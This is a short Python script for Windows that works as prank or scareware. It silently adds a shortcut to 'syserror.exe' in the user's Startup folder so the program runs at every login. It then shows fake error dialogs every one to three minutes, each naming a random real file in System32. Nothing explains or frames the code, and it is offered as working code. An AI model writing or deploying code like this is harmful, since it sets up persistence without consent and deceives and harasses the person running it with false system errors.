from tkinter import Tk, messagebox
import random
import getpass
USERNAME = getpass.getuser()
import os
from time import sleep
import win32com.client
if os.path.isfile('C:\\Users\\'+USERNAME+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\0.lnk') == False:
    pathto = 'C:\\Users\\'+USERNAME+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    pathtos = pathto+'\\0.lnk'
    target = os.getcwd()+'\\syserror.exe'
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(pathtos)
    shortcut.Targetpath = target
    
    shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
    shortcut.save()
x = os.scandir('C:\\Windows\\System32')
y = []
for entry in x:
    if entry.is_file():
        y.append(entry.name)       
while True:
    sleep(random.randint(60,180))
    root = Tk()
    root.withdraw()
    root.wm_attributes("-topmost", 1)
    messagebox.showerror('Error','Error '+str(random.randint(1,255))+' at file C:\\Windows\\System32\\'+random.choice(y))
    root.destroy()